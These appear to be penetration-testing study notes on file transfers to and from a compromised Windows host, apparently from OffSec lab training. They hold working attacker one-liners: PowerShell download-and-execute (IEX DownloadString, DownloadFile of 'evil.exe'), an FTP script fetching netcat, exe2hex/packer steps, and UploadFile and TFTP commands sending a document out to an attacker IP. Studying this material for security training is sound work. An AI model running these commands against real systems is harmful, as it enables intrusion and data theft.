# File Transfers

sudo apt install pure-ftpd

```bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
systemctl restart pure-ftpd
```
sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/

We could make a text file that contains the FTP process:
```
open 192.168.119.153
USER offsec
lab>
bin
GET nc.exe
bye
```

And transfer it to the target:
`ftp -v -n -s:ftp.txt`

* `-v` to suppress output.
* `-n` to suppress automatic login.
* `-s` to indicate the filename of commands.

One liner Powershell downloader:  
`powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.0.20/evil.exe', 'new-exploit.exe')`  

Download and execute a script without saving to disk:  
`powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.0.1/helloworld.ps1')`  

### Windows Uploads with exe2hex and PS.
Sample flow. Find and inspect file:
```
locate nc.exe | grep binaries
cp /usr/share/windows-resources/binaries/nc.exe .
ls -lh nc.exe
# Note file size

upz -9 nc.exe
# PE compression tool / executable packer.
# Note file size again.

# Conver to a Windows script to run which will convert the file to hex and instruct Powershell to reassemble back to binary:  
exe2hex -x nc.exe -p nc.cmd

# Check it
head nc.cmd
```

### Windows Scripting Uploads

Create a simple PHP upload script:
```php
<?php
$uploaddir = '/var/www/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```
And POST data to it:  
`powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')`

### Use TFTP

Setup on kali:
```bash
sudo apt update && sudo apt install atftp
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp
```

On windows use `-i` for a binary transfer and `put` for an upload:  
`tftp -i 10.11.0.4 put important.docx`




